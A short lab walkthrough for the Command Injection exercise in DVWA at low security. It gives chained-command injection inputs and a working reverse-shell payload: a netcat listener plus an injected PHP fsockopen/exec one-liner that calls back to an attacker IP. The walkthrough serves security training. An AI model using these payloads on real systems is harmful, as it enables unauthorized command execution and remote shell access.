# 🧨 Command Injection – Low Security Level

### 🛠️ Objective:
Exploit unsanitized input that is passed directly to the system shell, allowing arbitrary command execution.

---

### 🧭 Step-by-Step Walkthrough

1. Navigate to the **Command Injection** page in DVWA.
2. Enter any IP address in the input field (e.g., `127.0.0.1`) and submit.
3. The application responds with a successful **ping** output.

---

### 🔓 Command Injection Exploitation

At this level, the application does not sanitize user input. This allows chaining additional system commands using:

- `;`
- `&&`
- `|`
- `||`

#### 💣 Example Commands:
```bash
127.0.0.1; ls
127.0.0.1 && hostname
127.0.0.1 | whoami
````

These commands are executed by the server shell and their output is returned in the browser.

---

### 🐚 Reverse Shell Example

A reverse shell can be triggered using PHP and Netcat.

#### 🔁 Steps:

1. Start a Netcat listener in your terminal:

   ```bash
   nc -nlvp 4242
   ```

2. Submit the following payload:

   ```bash
   127.0.0.1;php -r '$sock=fsockopen("192.168.77.54",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
   ```

> 📌 Replace `192.168.77.54` with your attack machine's IP address.

---

### 🧩 Why This Works

There is **no input sanitization or validation**. The input is passed directly to the OS command interpreter, allowing full shell access.

---

## ✅ Status

* ✅ Easily exploitable
* 🟢 Beginner-friendly
